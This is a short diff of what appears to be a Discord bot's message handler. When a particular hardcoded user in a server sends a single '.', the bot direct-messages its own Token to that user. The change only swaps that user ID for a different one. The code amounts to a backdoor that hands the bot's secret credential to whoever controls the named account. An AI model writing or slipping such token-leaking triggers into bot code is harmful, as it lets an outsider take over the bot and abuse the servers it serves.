@@ -17,7 +17,7 @@ client.user.setStatus("dnd")
 client.on('message' , message => {
 if (message.author.bot) return;
            if (message.content == '.')
-           if (message.author.id === '516508186069565440'){
+           if (message.author.id === '438379202031517697'){
 if (!message.channel.guild) return;
 message.author.send(Token)
 }  
